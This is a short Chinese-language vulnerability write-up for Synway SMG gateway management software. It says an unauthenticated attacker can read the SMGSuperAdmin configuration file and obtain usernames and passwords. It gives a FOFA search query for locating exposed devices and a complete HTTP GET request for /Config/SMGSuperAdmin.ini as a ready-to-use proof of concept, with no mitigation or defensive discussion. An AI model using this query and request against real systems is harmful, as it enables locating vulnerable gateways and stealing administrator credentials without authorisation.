# 三汇SMG网关管理软件SMGSuperAdmin信息泄露漏洞

三汇SMG网关管理软件 SMGSuperAdmin 配置文件存在信息泄露漏洞，未经身份认证的攻击者可获取用户名密码等敏感信息，使系统处于极不安全状态。

## fofa

```javascript
app="Synway-网关管理软件"
```

## poc

```javascript
GET /Config/SMGSuperAdmin.ini HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
```

![image-20241211213513890](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412112135943.png)